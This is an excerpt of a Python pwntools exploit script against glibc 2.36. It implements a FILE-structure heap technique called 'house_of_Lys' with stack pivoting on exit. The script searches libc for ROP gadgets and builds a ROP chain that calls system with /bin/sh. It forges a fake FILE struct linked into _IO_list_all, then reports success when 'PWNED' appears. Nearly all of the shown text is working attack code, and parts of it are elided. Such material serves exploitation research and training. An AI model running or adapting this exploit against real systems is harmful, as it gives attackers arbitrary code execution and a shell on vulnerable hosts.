...
GLIBC_VERSION = "2.36-0ubuntu4"
IO_OBSTACK_JUMPS_OFFSET = 0x1f33a0
...
def exploit():
    ...
    # Find magic gadgets for 2.36 variant:
    # gadget1: mov rdx, qword ptr [rax + 0x38]; mov rdi, rax; call qword ptr [rdx + 0x20]
    try:
        magic_gadget_one = next(libc.search(asm("mov rdx, qword ptr [rax + 0x38]; mov rdi, rax; call qword ptr [rdx + 0x20]")))
    ...
    # gadget3: add rsp, 0x38; mov rax, rcx; ret
    try:
        magic_gadget_three = next(libc.search(asm("add rsp, 0x38; mov rax, rcx; ret")))
    except StopIteration:
    ...
    # Need extra ret for stack alignment (movaps in system requires 16-byte aligned rsp)
    rop_chain = flat([
        ret,
        pop_rdi,
        bin_sh,
    ...
    # We'll write the fake FILE to the heap, then point _IO_list_all to it
    # Need to set _lock to valid writable zeroed memory
    # Also need _chain = 0 to stop iteration

    fake_file = IO_FILE_plus_struct()
    fake_file._lock = fp_addr + needed_size - 0x20
    fake_file.chain = 0
    payload = fake_file.house_of_Lys_stack_pivoting_when_exit_in_2_36(
    ...
    try:
        ...
        if b"PWNED" in result:
            log.success("house_of_Lys_stack_pivoting_in_2_36: SUCCESS")
            io.close()
            return True
    except:
        pass

    log.failure("house_of_Lys_stack_pivoting_in_2_36: FAILED")
    io.close()
    return False
